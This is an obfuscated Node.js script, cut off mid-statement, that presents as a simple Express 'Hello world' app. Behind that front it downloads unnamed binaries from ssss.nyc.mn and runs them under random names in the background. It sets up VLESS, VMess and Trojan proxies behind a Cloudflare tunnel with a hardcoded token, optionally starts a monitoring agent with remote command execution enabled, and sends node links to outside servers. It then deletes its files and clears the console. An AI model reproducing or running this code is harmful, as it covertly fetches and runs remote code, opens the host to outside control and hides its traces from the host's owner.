const _0xc22f72=_0x897d;(function(_0x1ded41,_0x1d8f43){const _0x2cb3d5=_0x897d,_0x27d326=_0x1ded41();while(!![]){try{const _0x5ba88e=parseInt(_0x2cb3d5(0x298))/0x1+parseInt(_0x2cb3d5(0x28e))/0x2*(parseInt(_0x2cb3d5(0x223))/0x3)+parseInt(_0x2cb3d5(0x275))/0x4+parseInt(_0x2cb3d5(0x1f7))/0x5*(-parseInt(_0x2cb3d5(0x221))/0x6)+parseInt(_0x2cb3d5(0x21a))/0x7+parseInt(_0x2cb3d5(0x253))/0x8*(parseInt(_0x2cb3d5(0x21f))/0x9)+parseInt(_0x2cb3d5(0x2a4))/0xa*(-parseInt(_0x2cb3d5(0x29a))/0xb);if(_0x5ba88e===_0x1d8f43)break;else _0x27d326['push'](_0x27d326['shift']());}catch(_0x109f81){_0x27d326['push'](_0x27d326['shift']());}}}(_0x27e5,0xa82b4));const express=require(_0xc22f72(0x297)),app=express(),axios=require(_0xc22f72(0x25c)),os=require('os'),fs=require('fs'),path=require(_0xc22f72(0x24d)),{promisify}=require(_0xc22f72(0x26b)),exec=promisify(require(_0xc22f72(0x22d))[_0xc22f72(0x260)]),{execSync}=require(_0xc22f72(0x22d)),UPLOAD_URL=process[_0xc22f72(0x1f6)][_0xc22f72(0x29b)]||'',PROJECT_URL=process[_0xc22f72(0x1f6)][_0xc22f72(0x25d)]||'',AUTO_ACCESS=process[_0xc22f72(0x1f6)][_0xc22f72(0x27a)]||![],FILE_PATH=process['env'][_0xc22f72(0x1e6)]||_0xc22f72(0x1f3),SUB_PATH=process[_0xc22f72(0x1f6)][_0xc22f72(0x242)]||_0xc22f72(0x21c),PORT=process['env']['SERVER_PORT']||process[_0xc22f72(0x1f6)][_0xc22f72(0x239)]||0xbb8,UUID=process[_0xc22f72(0x1f6)]['UUID']||_0xc22f72(0x286),NEZHA_SERVER=process[_0xc22f72(0x1f6)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0xc22f72(0x1f6)][_0xc22f72(0x1f5)]||'',NEZHA_KEY=process[_0xc22f72(0x1f6)][_0xc22f72(0x295)]||'',ARGO_DOMAIN=process[_0xc22f72(0x1f6)][_0xc22f72(0x1f0)]||_0xc22f72(0x296),ARGO_AUTH=process[_0xc22f72(0x1f6)][_0xc22f72(0x205)]||'eyJhIjoiNDA4OTg1YjU4NDk3OGVhYTZlZTIxOTAxNWUyZGJmZWQiLCJ0IjoiNDI1MWJhMmMtMjg2Ny00ZDYzLTg1ODItNzdjMWU0MDUwNGE3IiwicyI6Ik1tWTFaRE5oTnpRdE5tSm1aaTAwTVRWbExXSTRaVEV0WmpoaU5tRTBNREkyWXpjMCJ9',ARGO_PORT=process['env'][_0xc22f72(0x29e)]||0x1f41,CFIP=process[_0xc22f72(0x1f6)][_0xc22f72(0x210)]||_0xc22f72(0x22b),CFPORT=process[_0xc22f72(0x1f6)][_0xc22f72(0x26c)]||0x1bb,NAME=process[_0xc22f72(0x1f6)][_0xc22f72(0x2ac)]||_0xc22f72(0x22c);!fs['existsSync'](FILE_PATH)?(fs[_0xc22f72(0x20e)](FILE_PATH),console[_0xc22f72(0x243)](FILE_PATH+_0xc22f72(0x249))):console[_0xc22f72(0x243)](FILE_PATH+_0xc22f72(0x270));function _0x27e5(){const _0x5e895b=['tunnel\x20--edge-ip-version\x20auto\x20--config\x20','isFile','&path=%2Fvless-argo%3Fed%3D2560#','Empowerment\x20success\x20for\x20','charAt','toString','basename','1360268iowXaN','\x20-c\x20\x22','sub','send','unlinkSync','180LLTviP','existsSync','80916ORhTMm','Unhandled\x20error\x20in\x20startserver:','1135527YYsKJN','sub.txt','blackhole','firefox','tcp','Hello\x20world!','xtls-rprx-vision','quic','cdns.doon.eu.org','kawakk','child_process','pop','pkill\x20-f\x20\x22[','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20-c\x20','Skipping\x20adding\x20automatic\x20access\x20task','catch','del\x20/f\x20/q\x20','success','http','includes','\x0a\x20\x20credentials-file:\x20','PORT','\x20is\x20running','&fp=firefox&type=ws&host=','/dev/null','443','fileName','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','push','split','SUB_PATH','log','/api/add-subscriptions','pipe','trojan','match','createWriteStream','\x20is\x20created','base64','all','message','path','readdirSync','get','text/plain;\x20charset=utf-8','ARGO_DOMAIN:','Error\x20in\x20startserver:','139032IjvLWq','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','utf-8','?security=tls&sni=','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','data','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','axios','PROJECT_URL','/vmess-argo?ed=2560','\x0avless://','exec','stringify','tls','length','aarch64','join','true','\x20>\x20nul\x202>&1','/config.json\x20>/dev/null\x202>&1\x20&','php\x20running\x20error:\x20','writeFileSync','util','CFPORT','win32','org','https://arm64.ssss.nyc.mn/web','\x20already\x20exists','\x0a\x0atrojan://','listen','&path=%2Ftrojan-argo%3Fed%3D2560#','set','517808mlJMRm','2087','--tls','https://oooo.serv00.net/add-url','block','AUTO_ACCESS','\x20failed:\x20','2096','false','substring','\x20-p\x20','automatic\x20access\x20task\x20added\x20successfully','arch','https://arm64.ssss.nyc.mn/agent','map','vmess','amd','e2fea386-d98c-11f0-aa3a-325096b39f47','https://amd64.ssss.nyc.mn/web','127.0.0.1','application/json','\x0a\x0avmess://','country_code','freedom','\x20-s\x20','2tABhFD','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://arm64.ssss.nyc.mn/bot','countryCode','tunnel.yml','Empowerment\x20failed\x20for\x20','random','NEZHA_KEY','f.ssjhwniy.icu','express','57092DslmDs','2083','11gumMXB','UPLOAD_URL','\x22\x20>\x20/dev/null\x202>&1','Content-Type','ARGO_PORT','unshift','?encryption=none&security=tls&sni=','platform','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','1484170EPheuq','test','/vless-argo','from','status','finish','taskkill\x20/f\x20/im\x20','.exe\x20>\x20nul\x202>&1','NAME','https://amd64.ssss.nyc.mn/agent','npm\x20running\x20error:\x20','FILE_PATH','ArgoDomain:','vless','statSync','tunnel.json','direct','floor','boot.log','config.yaml','App\x20is\x20running','ARGO_DOMAIN','Error\x20downloading\x20files:','nohup\x20','./tmp','forEach','NEZHA_PORT','env','100QRWssa','has','\x20>/dev/null\x202>&1\x20&','/vmess-argo','stream','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Error\x20reading\x20boot.log:','none','list.txt','rm\x20-rf\x20','error','then','arm','readFileSync','ARGO_AUTH','response','Error\x20executing\x20command:\x20','Nodes\x20uploaded\x20successfully','clear','/api/delete-nodes','\x0aclient_secret:\x20','close','/trojan-argo','mkdirSync','config.json','CFIP','post','2053'];_0x27e5=function(){return _0x5e895b;};return _0x27e5();}function generateRandomName(){const _0x2e0ece=_0xc22f72,_0x4c4d0e='abcdefghijklmnopqrstuvwxyz';let _0x11abc3='';for(let _0x2d7a01=0x0;_0x2d7a01<0x6;_0x2d7a01++){_0x11abc3+=_0x4c4d0e[_0x2e0ece(0x217)](Math[_0x2e0ece(0x1ec)](Math[_0x2e0ece(0x294)]()*_0x4c4d0e[_0x2e0ece(0x263)]));}return _0x11abc3;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0xc22f72(0x265)](FILE_PATH,phpName),webPath=path[_0xc22f72(0x265)](FILE_PATH,webName),botPath=path[_0xc22f72(0x265)](FILE_PATH,botName),subPath=path[_0xc22f72(0x265)](FILE_PATH,_0xc22f72(0x224)),listPath=path[_0xc22f72(0x265)](FILE_PATH,_0xc22f72(0x1ff)),bootLogPath=path['join'](FILE_PATH,_0xc22f72(0x1ed)),configPath=path[_0xc22f72(0x265)](FILE_PATH,_0xc22f72(0x20f));function deleteNodes(){const _0x3d4594=_0xc22f72;try{if(!UPLOAD_URL)return;if(!fs[_0x3d4594(0x220)](subPath))return;let _0xcc3a49;try{_0xcc3a49=fs['readFileSync'](subPath,_0x3d4594(0x257));}catch{return null;}const _0x18cc0a=Buffer[_0x3d4594(0x2a7)](_0xcc3a49,'base64')[_0x3d4594(0x218)](_0x3d4594(0x257)),_0x29713e=_0x18cc0a['split']('\x0a')['filter'](_0x1e1de7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1e1de7));if(_0x29713e[_0x3d4594(0x263)]===0x0)return;return axios[_0x3d4594(0x211)](UPLOAD_URL+_0x3d4594(0x20a),JSON['stringify']({'nodes':_0x29713e}),{'headers':{'Content-Type':_0x3d4594(0x289)}})[_0x3d4594(0x233)](_0x5f346d=>{return null;}),null;}catch(_0x57638d){return null;}}function cleanupOldFiles(){const _0x1622da=_0xc22f72;try{const _0x11ba63=fs[_0x1622da(0x24e)](FILE_PATH);_0x11ba63[_0x1622da(0x1f4)](_0x2caf4c=>{const _0x40f25f=_0x1622da,_0x47dfbf=path['join'](FILE_PATH,_0x2caf4c);try{const _0x5ea3f6=fs[_0x40f25f(0x1e9)](_0x47dfbf);_0x5ea3f6[_0x40f25f(0x214)]()&&fs[_0x40f25f(0x21e)](_0x47dfbf);}catch(_0x43394d){}});}catch(_0xae7b18){}}app[_0xc22f72(0x24f)]('/',function(_0x3d97af,_0x42caaa){const _0x2101e2=_0xc22f72;_0x42caaa['send'](_0x2101e2(0x228));});function _0x897d(_0xedfd09,_0xbe8652){_0xedfd09=_0xedfd09-0x1e4;const _0x27e5a0=_0x27e5();let _0x897dcf=_0x27e5a0[_0xedfd09];return _0x897dcf;}async function generateConfig(){const _0x2f52b3=_0xc22f72,_0x5da550={'log':{'access':'/dev/null','error':_0x2f52b3(0x23c),'loglevel':_0x2f52b3(0x1fe)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x2f52b3(0x1e8),'settings':{'clients':[{'id':UUID,'flow':_0x2f52b3(0x229)}],'decryption':_0x2f52b3(0x1fe),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x2f52b3(0x1fa),'dest':0xbbb},{'path':_0x2f52b3(0x20d),'dest':0xbbc}]},'streamSettings':{'network':_0x2f52b3(0x227)}},{'port':0xbb9,'listen':_0x2f52b3(0x288),'protocol':_0x2f52b3(0x1e8),'settings':{'clients':[{'id':UUID}],'decryption':_0x2f52b3(0x1fe)},'streamSettings':{'network':_0x2f52b3(0x227),'security':_0x2f52b3(0x1fe)}},{'port':0xbba,'listen':_0x2f52b3(0x288),'protocol':_0x2f52b3(0x1e8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x2f52b3(0x1fe),'wsSettings':{'path':_0x2f52b3(0x2a6)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f52b3(0x236),_0x2f52b3(0x262),_0x2f52b3(0x22a)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x2f52b3(0x288),'protocol':_0x2f52b3(0x284),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2f52b3(0x1fa)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f52b3(0x236),_0x2f52b3(0x262),_0x2f52b3(0x22a)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2f52b3(0x288),'protocol':_0x2f52b3(0x246),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x2f52b3(0x20d)}},'sniffing':{'enabled':!![],'destOverride':[_0x2f52b3(0x236),'tls',_0x2f52b3(0x22a)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x2f52b3(0x28c),'tag':_0x2f52b3(0x1eb)},{'protocol':_0x2f52b3(0x225),'tag':_0x2f52b3(0x279)}]};fs[_0x2f52b3(0x26a)](path[_0x2f52b3(0x265)](FILE_PATH,_0x2f52b3(0x20f)),JSON[_0x2f52b3(0x261)](_0x5da550,null,0x2));}function getSystemArchitecture(){const _0x3f3938=_0xc22f72,_0x31909d=os[_0x3f3938(0x281)]();return _0x31909d===_0x3f3938(0x203)||_0x31909d==='arm64'||_0x31909d===_0x3f3938(0x264)?'arm':_0x3f3938(0x285);}function downloadFile(_0xfc8f4a,_0x2597fe,_0x5cfcaf){const _0x337e80=_0xc22f72,_0x388c9c=_0xfc8f4a;!fs[_0x337e80(0x220)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x25b6ac=fs[_0x337e80(0x248)](_0x388c9c);axios({'method':_0x337e80(0x24f),'url':_0x2597fe,'responseType':_0x337e80(0x1fb)})[_0x337e80(0x202)](_0x1275ae=>{const _0x58af57=_0x337e80;_0x1275ae['data'][_0x58af57(0x245)](_0x25b6ac),_0x25b6ac['on'](_0x58af57(0x2a9),()=>{const _0x3d3c2e=_0x58af57;_0x25b6ac[_0x3d3c2e(0x20c)](),console['log']('Download\x20'+path[_0x3d3c2e(0x219)](_0x388c9c)+'\x20successfully'),_0x5cfcaf(null,_0x388c9c);}),_0x25b6ac['on']('error',_0x4661db=>{const _0x188a8a=_0x58af57;fs['unlink'](_0x388c9c,()=>{});const _0x434aef='Download\x20'+path[_0x188a8a(0x219)](_0x388c9c)+_0x188a8a(0x27b)+_0x4661db[_0x188a8a(0x24c)];console[_0x188a8a(0x201)](_0x434aef),_0x5cfcaf(_0x434aef);});})[_0x337e80(0x233)](_0x212bb5=>{const _0x536679=_0x337e80,_0x230865='Download\x20'+path[_0x536679(0x219)](_0x388c9c)+_0x536679(0x27b)+_0x212bb5[_0x536679(0x24c)];console[_0x536679(0x201)](_0x230865),_0x5cfcaf(_0x230865);});}async function downloadFilesAndRun(){const _0xea57b7=_0xc22f72,_0x1b14d9=getSystemArchitecture(),_0x5516b0=getFilesForArchitecture(_0x1b14d9);if(_0x5516b0[_0xea57b7(0x263)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3bb707=_0x5516b0[_0xea57b7(0x283)](_0x206809=>{return new Promise((_0x546c55,_0x12d6b7)=>{const _0xa4661=_0x897d;downloadFile(_0x206809[_0xa4661(0x23e)],_0x206809['fileUrl'],(_0x38dab5,_0x5e7409)=>{_0x38dab5?_0x12d6b7(_0x38dab5):_0x546c55(_0x5e7409);});});});try{await Promise[_0xea57b7(0x24b)](_0x3bb707);}catch(_0x984918){console['error'](_0xea57b7(0x1f1),_0x984918);return;}function _0xf89eef(_0x5a9551){const _0xdea932=0x1fd;_0x5a9551['forEach'](_0x2ffdd6=>{const _0x151e95=_0x897d;fs[_0x151e95(0x220)](_0x2ffdd6)&&fs['chmod'](_0x2ffdd6,_0xdea932,_0x4685dd=>{const _0x5b1789=_0x151e95;_0x4685dd?console['error'](_0x5b1789(0x293)+_0x2ffdd6+':\x20'+_0x4685dd):console[_0x5b1789(0x243)](_0x5b1789(0x216)+_0x2ffdd6+':\x20'+_0xdea932[_0x5b1789(0x218)](0x8));});});}const _0x11318e=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xf89eef(_0x11318e);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x250bff=NEZHA_SERVER[_0xea57b7(0x237)](':')?NEZHA_SERVER[_0xea57b7(0x241)](':')[_0xea57b7(0x22e)]():'',_0x3b204b=new Set([_0xea57b7(0x23d),'8443',_0xea57b7(0x27c),_0xea57b7(0x276),_0xea57b7(0x299),'2053']),_0x46045c=_0x3b204b[_0xea57b7(0x1f8)](_0x250bff)?_0xea57b7(0x266):_0xea57b7(0x27d),_0x25d932=_0xea57b7(0x20b)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0xea57b7(0x25b)+_0x46045c+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0xea57b7(0x265)](FILE_PATH,_0xea57b7(0x1ee)),_0x25d932);const _0x560207=_0xea57b7(0x1f2)+phpPath+_0xea57b7(0x21b)+FILE_PATH+_0xea57b7(0x230);try{await exec(_0x560207),console['log'](phpName+_0xea57b7(0x23a)),await new Promise(_0x44fe0a=>setTimeout(_0x44fe0a,0x3e8));}catch(_0x20ac9f){console[_0xea57b7(0x201)](_0xea57b7(0x269)+_0x20ac9f);}}else{let _0x39a75b='';const _0x59f65d=[_0xea57b7(0x23d),'8443',_0xea57b7(0x27c),_0xea57b7(0x276),'2083',_0xea57b7(0x212)];_0x59f65d[_0xea57b7(0x237)](NEZHA_PORT)&&(_0x39a75b=_0xea57b7(0x277));const _0x1fb277=_0xea57b7(0x1f2)+npmPath+_0xea57b7(0x28d)+NEZHA_SERVER+':'+NEZHA_PORT+_0xea57b7(0x27f)+NEZHA_KEY+'\x20'+_0x39a75b+_0xea57b7(0x256);try{await exec(_0x1fb277),console[_0xea57b7(0x243)](npmName+_0xea57b7(0x23a)),await new Promise(_0x4f4e44=>setTimeout(_0x4f4e44,0x3e8));}catch(_0x496b1b){console['error'](_0xea57b7(0x1e5)+_0x496b1b);}}}else console[_0xea57b7(0x243)](_0xea57b7(0x28f));const _0x3ece11=_0xea57b7(0x1f2)+webPath+_0xea57b7(0x231)+FILE_PATH+_0xea57b7(0x268);try{await exec(_0x3ece11),console[_0xea57b7(0x243)](webName+_0xea57b7(0x23a)),await new Promise(_0x25b4e8=>setTimeout(_0x25b4e8,0x3e8));}catch(_0x4c3559){console[_0xea57b7(0x201)]('web\x20running\x20error:\x20'+_0x4c3559);}if(fs[_0xea57b7(0x220)](botPath)){let _0x4e6377;if(ARGO_AUTH[_0xea57b7(0x247)](/^[A-Z0-9a-z=]{120,250}$/))_0x4e6377=_0xea57b7(0x1fc)+ARGO_AUTH;else ARGO_AUTH[_0xea57b7(0x247)](/TunnelSecret/)?_0x4e6377=_0xea57b7(0x213)+FILE_PATH+'/tunnel.yml\x20run':_0x4e6377=_0xea57b7(0x2a2)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0xea57b7(0x1f2)+botPath+'\x20'+_0x4e6377+_0xea57b7(0x1f9)),console[_0xea57b7(0x243)](botName+_0xea57b7(0x23a)),await new Promise(_0x47b010=>setTimeout(_0x47b010,0x7d0));}catch(_0x4509d7){console['error'](_0xea57b7(0x207)+_0x4509d7);}}await new Promise(_0x15cb41=>setTimeout(_0x15cb41,0x1388));}function getFilesForArchitecture(_0x2af121){const _0x1681b6=_0xc22f72;let _0x39775c;_0x2af121==='arm'?_0x39775c=[{'fileName':webPath,'fileUrl':_0x1681b6(0x26f)},{'fileName':botPath,'fileUrl':_0x1681b6(0x290)}]:_0x39775c=[{'fileName':webPath,'fileUrl':_0x1681b6(0x287)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2bdfae=_0x2af121==='arm'?_0x1681b6(0x282):_0x1681b6(0x1e4);_0x39775c[_0x1681b6(0x29f)]({'fileName':npmPath,'fileUrl':_0x2bdfae});}else{const _0x742de=_0x2af121===_0x1681b6(0x203)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x39775c[_0x1681b6(0x29f)]({'fileName':phpPath,'fileUrl':_0x742de});}}return _0x39775c;}function argoType(){const _0x460d4c=_0xc22f72;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x460d4c(0x255));return;}if(ARGO_AUTH[_0x460d4c(0x237)]('TunnelSecret')){fs['writeFileSync'](path[_0x460d4c(0x265)](FILE_PATH,_0x460d4c(0x1ea)),ARGO_AUTH);const _0x5a35d7='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x460d4c(0x241)]('\x22')[0xb]+_0x460d4c(0x238)+path[_0x460d4c(0x265)](FILE_PATH,_0x460d4c(0x1ea))+_0x460d4c(0x259)+ARGO_DOMAIN+_0x460d4c(0x2a3)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x460d4c(0x26a)](path[_0x460d4c(0x265)](FILE_PATH,_0x460d4c(0x292)),_0x5a35d7);}else console[_0x460d4c(0x243)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x438049=_0xc22f72;let _0xca64d8;if(ARGO_AUTH&&ARGO_DOMAIN)_0xca64d8=ARGO_DOMAIN,console[_0x438049(0x243)](_0x438049(0x251),_0xca64d8),await _0x5e835b(_0xca64d8);else try{const _0x1e8453=fs[_0x438049(0x204)](path[_0x438049(0x265)](FILE_PATH,_0x438049(0x1ed)),_0x438049(0x257)),_0x54e219=_0x1e8453[_0x438049(0x241)]('\x0a'),_0x47a531=[];_0x54e219[_0x438049(0x1f4)](_0x16a74f=>{const _0x1930d5=_0x438049,_0x1a2cbb=_0x16a74f[_0x1930d5(0x247)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1a2cbb){const _0x5e2952=_0x1a2cbb[0x1];_0x47a531[_0x1930d5(0x240)](_0x5e2952);}});if(_0x47a531[_0x438049(0x263)]>0x0)_0xca64d8=_0x47a531[0x0],console[_0x438049(0x243)](_0x438049(0x1e7),_0xca64d8),await _0x5e835b(_0xca64d8);else{console[_0x438049(0x243)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x438049(0x21e)](path[_0x438049(0x265)](FILE_PATH,_0x438049(0x1ed)));async function _0xe4dcde(){const _0x16d31e=_0x438049;try{process[_0x16d31e(0x2a1)]===_0x16d31e(0x26d)?await exec(_0x16d31e(0x2aa)+botName+_0x16d31e(0x2ab)):await exec(_0x16d31e(0x22f)+botName['charAt'](0x0)+']'+botName[_0x16d31e(0x27e)](0x1)+_0x16d31e(0x29c));}catch(_0x2c3ee5){}}_0xe4dcde(),await new Promise(_0x406715=>setTimeout(_0x406715,0xbb8));const _0x5c3854='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x438049(0x254)+ARGO_PORT;try{await exec(_0x438049(0x1f2)+botPath+'\x20'+_0x5c3854+_0x438049(0x1f9)),console[_0x438049(0x243)](botName+_0x438049(0x23a)),await new Promise(_0x160e09=>setTimeout(_0x160e09,0xbb8)),await extractDomains();}catch(_0x2a19df){console[_0x438049(0x201)](_0x438049(0x207)+_0x2a19df);}}}catch(_0x162709){console[_0x438049(0x201)](_0x438049(0x1fd),_0x162709);}async function _0x34fbc3(){const _0x4248a1=_0x438049;try{const _0xc667c1=await axios[_0x4248a1(0x24f)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0xc667c1[_0x4248a1(0x25a)]&&_0xc667c1[_0x4248a1(0x25a)][_0x4248a1(0x28b)]&&_0xc667c1[_0x4248a1(0x25a)][_0x4248a1(0x26e)])return _0xc667c1[_0x4248a1(0x25a)][_0x4248a1(0x28b)]+'_'+_0xc667c1[_0x4248a1(0x25a)][_0x4248a1(0x26e)];}catch(_0x18a041){try{const _0xfac229=await axios[_0x4248a1(0x24f)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0xfac229['data']&&_0xfac229[_0x4248a1(0x25a)][_0x4248a1(0x2a8)]===_0x4248a1(0x235)&&_0xfac229[_0x4248a1(0x25a)][_0x4248a1(0x291)]&&_0xfac229[_0x4248a1(0x25a)][_0x4248a1(0x26e)])return _0xfac229[_0x4248a1(0x25a)]['countryCode']+'_'+_0xfac229['data']['org'];}catch(_0x170bfa){}}return'Unknown';}async function _0x5e835b(_0x16811e){const _0x719374=await _0x34fbc3(),_0x1d8cc5=NAME?NAME+'-'+_0x719374:_0x719374;return new Promise(_0x4d8702=>{setTimeout(()=>{const _0x3f87c7=_0x897d,_0x1fcd41={'v':'2','ps':''+_0x1d8cc5,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3f87c7(0x1fe),'net':'ws','type':'none','host':_0x16811e,'path':_0x3f87c7(0x25e),'tls':_0x3f87c7(0x262),'sni':_0x16811e,'alpn':'','fp':_0x3f87c7(0x226)},_0x22a4b7=_0x3f87c7(0x25f)+UUID+'@'+CFIP+':'+CFPORT+_0x3f87c7(0x2a0)+_0x16811e+_0x3f87c7(0x23b)+_0x16811e+_0x3f87c7(0x215)+_0x1d8cc5+_0x3f87c7(0x28a)+Buffer['from'](JSON['stringify'](_0x1fcd41))[_0x3f87c7(0x218)](_0x3f87c7(0x24a))+_0x3f87c7(0x271)+UUID+'@'+CFIP+':'+CFPORT+_0x3f87c7(0x258)+_0x16811e+_0x3f87c7(0x23b)+_0x16811e+_0x3f87c7(0x273)+_0x1d8cc5+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x22a4b7)['toString'](_0x3f87c7(0x24a))),fs[_0x3f87c7(0x26a)](subPath,Buffer[_0x3f87c7(0x2a7)](_0x22a4b7)[_0x3f87c7(0x218)]('base64')),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x503b74,_0x4ca25b)=>{const _0x41d182=_0x3f87c7,_0x362c22=Buffer[_0x41d182(0x2a7)](_0x22a4b7)[_0x41d182(0x218)](_0x41d182(0x24a));_0x4ca25b[_0x41d182(0x274)](_0x41d182(0x29d),_0x41d182(0x250)),_0x4ca25b[_0x41d182(0x21d)](_0x362c22);}),_0x4d8702(_0x22a4b7);},0x7d0);});}}async function uploadNodes(){const _0x34e2ee=_0xc22f72;if(UPLOAD_URL&&PROJECT_URL){const _0x37d3ac=PROJECT_URL+'/'+SUB_PATH,_0x30ce12={'subscription':[_0x37d3ac]};try{const _0x4440b2=await axios[_0x34e2ee(0x211)](UPLOAD_URL+_0x34e2ee(0x244),_0x30ce12,{'headers':{'Content-Type':_0x34e2ee(0x289)}});return _0x4440b2&&_0x4440b2[_0x34e2ee(0x2a8)]===0xc8?(console[_0x34e2ee(0x243)]('Subscription\x20uploaded\x20successfully'),_0x4440b2):null;}catch(_0x3c1b7c){if(_0x3c1b7c[_0x34e2ee(0x206)]){if(_0x3c1b7c[_0x34e2ee(0x206)][_0x34e2ee(0x2a8)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x34e2ee(0x220)](listPath))return;const _0x22acb6=fs[_0x34e2ee(0x204)](listPath,_0x34e2ee(0x257)),_0x58aca7=_0x22acb6[_0x34e2ee(0x241)]('\x0a')['filter'](_0x2e9f4e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x34e2ee(0x2a5)](_0x2e9f4e));if(_0x58aca7[_0x34e2ee(0x263)]===0x0)return;const _0x172620=JSON[_0x34e2ee(0x261)]({'nodes':_0x58aca7});try{const _0x5049a0=await axios[_0x34e2ee(0x211)](UPLOAD_URL+'/api/add-nodes',_0x172620,{'headers':{'Content-Type':_0x34e2ee(0x289)}});return _0x5049a0&&_0x5049a0['status']===0xc8?(console[_0x34e2ee(0x243)](_0x34e2ee(0x208)),_0x5049a0):null;}catch(_0x2e0b75){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5894d3=_0x897d,_0x198151=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x198151[_0x5894d3(0x240)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x198151[_0x5894d3(0x240)](phpPath);process[_0x5894d3(0x2a1)]===_0x5894d3(0x26d)?exec(_0x5894d3(0x234)+_0x198151[_0x5894d3(0x265)]('\x20')+_0x5894d3(0x267),_0x42c8d5=>{const _0x1ee454=_0x5894d3;console[_0x1ee454(0x209)](),console[_0x1ee454(0x243)](_0x1ee454(0x1ef)),console[_0x1ee454(0x243)](_0x1ee454(0x23f));}):exec(_0x5894d3(0x200)+_0x198151[_0x5894d3(0x265)]('\x20')+'\x20>/dev/null\x202>&1',_0x216aa4=>{const _0x9ddd90=_0x5894d3;console['clear'](),console[_0x9ddd90(0x243)](_0x9ddd90(0x1ef)),console['log'](_0x9ddd90(0x23f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5cb5a7=_0xc22f72;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x5cb5a7(0x243)](_0x5cb5a7(0x232));return;}try{const _0x29c8c0=await axios['post'](_0x5cb5a7(0x278),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5cb5a7(0x289)}});return console[_0x5cb5a7(0x243)](_0x5cb5a7(0x280)),_0x29c8c0;}catch(_0x7327ff){return console[_0x5cb5a7(0x201)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x7327ff['message']),null;}}async function startserver(){const 